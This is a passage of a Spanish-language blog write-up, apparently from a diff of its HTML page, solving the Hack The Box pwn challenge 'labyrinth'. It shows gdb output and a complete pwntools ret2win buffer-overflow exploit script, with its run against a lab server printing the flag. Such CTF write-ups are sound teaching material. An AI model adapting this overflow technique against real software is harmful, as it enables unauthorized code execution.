+<p class="plain-text">También necesitamos la dirección de la función <code class="language-plaintext highlighter-rouge">escape_plan</code> esta la podemos obtener con <code class="language-plaintext highlighter-rouge">gdb</code> ayudandonos de la función <code class="language-plaintext highlighter-rouge">info function</code> y el nombre de esta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q ./labyrinth
+Reading symbols from </span><span class="ve">./labyrinth</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">./labyrinth</span><span class="p">)
+</span><span class="ro">gdb-peda$ </span><span class="p">info function escape_plan
+All functions matching regular expression "escape_plan":  
+
+Non-debugging symbols:
+</span><span class="az">0x0000000000401255  </span><span class="am">escape_plan
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos estos al script con la función <code class="language-plaintext highlighter-rouge">p64</code> de pwn y definimos el <code class="language-plaintext highlighter-rouge">payload</code> final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ret </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401016</span><span class="p">)
+escape_plan </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401255</span><span class="p">)
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+</span><span class="p"> ret </span><span class="o">+</span><span class="p"> escape_plan  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente en la conexión elegimos la puerta <code class="language-plaintext highlighter-rouge">69</code> y en el siguiente fgets enviamos nuestro <code class="language-plaintext highlighter-rouge">payload</code> asi que buscamos la linea con la <code class="language-plaintext highlighter-rouge">flag</code> y la mostramos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shell.sendline(</span><span class="no">b</span><span class="s">"69"</span><span class="p">)
+shell.sendline(payload)
+
+flag </span><span class="o">= </span><span class="p">shell.recvline_contains(</span><span class="no">b</span><span class="s">"HTB"</span><span class="p">).strip().decode()  
+log.success(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro script final seria el siguiente y al ejecutarlo con <code class="language-plaintext highlighter-rouge">host:port</code> del servidor que tenemos de target como <code class="language-plaintext highlighter-rouge">argumento</code> nos muestra finalmente la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="mi">*</span><span class="o">
+
+if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &lthost:port>"</span><span class="p">)  
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+host, port </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">].split(</span><span class="s">":"</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(host, port)
+
+offset </span><span class="o">= </span><span class="mi">56</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+ret </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401016</span><span class="p">)
+escape_plan </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401255</span><span class="p">)
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+</span><span class="p"> ret </span><span class="o">+</span><span class="p"> escape_plan
+
+shell.sendline(</span><span class="no">b</span><span class="s">"69"</span><span class="p">)
+shell.sendline(payload)
+
+flag </span><span class="o">= </span><span class="p">shell.recvline_contains(</span><span class="no">b</span><span class="s">"HTB"</span><span class="p">).strip().decode()  
+log.success(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py 165.224.124.42:31342
+[</span><span class="ve">+</span><span class="p">] Opening connection to 165.224.124.42 on port 31342: Done  
+[</span><span class="ve">+</span><span class="p">] Flag: HTB{3sc4p3_fr0m_4b0v3}
+[</span><span class="az">*</span><span class="p">] Closed connection to 165.224.124.42 port 31342</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
